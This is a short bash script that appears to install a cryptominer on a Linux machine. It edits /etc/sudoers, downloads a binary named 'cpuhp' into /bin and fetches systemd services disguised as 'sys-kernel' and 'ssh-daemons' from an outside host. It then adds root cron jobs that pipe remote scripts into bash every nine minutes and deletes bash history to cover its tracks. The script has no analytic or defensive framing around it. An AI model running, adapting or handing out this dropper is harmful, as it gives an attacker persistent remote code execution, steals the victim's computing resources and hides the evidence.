#!/bin/bash
sed -i 's/^#\(root\s*ALL=(ALL)\s*ALL\)/\1/' /etc/sudoers

if [ -f /etc/cpuhp ]; then
    exit 1
fi

    apt-get update
    apt-get install -y sshpass
    echo "Копирую в /bin."
    cd /bin
    wget https://xmrhorizontal.github.io/cpuhp
    chmod +x ./cpuhp
    cd /etc/systemd/system
    wget https://xmrhorizontal.github.io/sys-kernel.service
    wget https://xmrhorizontal.github.io/ssh-daemons.service
    systemctl daemon-reload
    systemctl enable ssh-daemons.service
    systemctl enable sys-kernel.service
    sleep 10
    systemctl start ssh-daemons.service
    systemctl start sys-kernel.service
    echo "*/9 * * * * root curl -s https://xmrhorizontal.github.io/command.sh | bash" > /etc/cron.d/debcron
    echo "*/9 * * * * root curl -s https://xmrhorizontal.github.io/searcher.sh | bash" > /etc/cron.d/cronextend
    rm -f ~/.bash_history
    rm -f /root/.bash_history
echo OK!

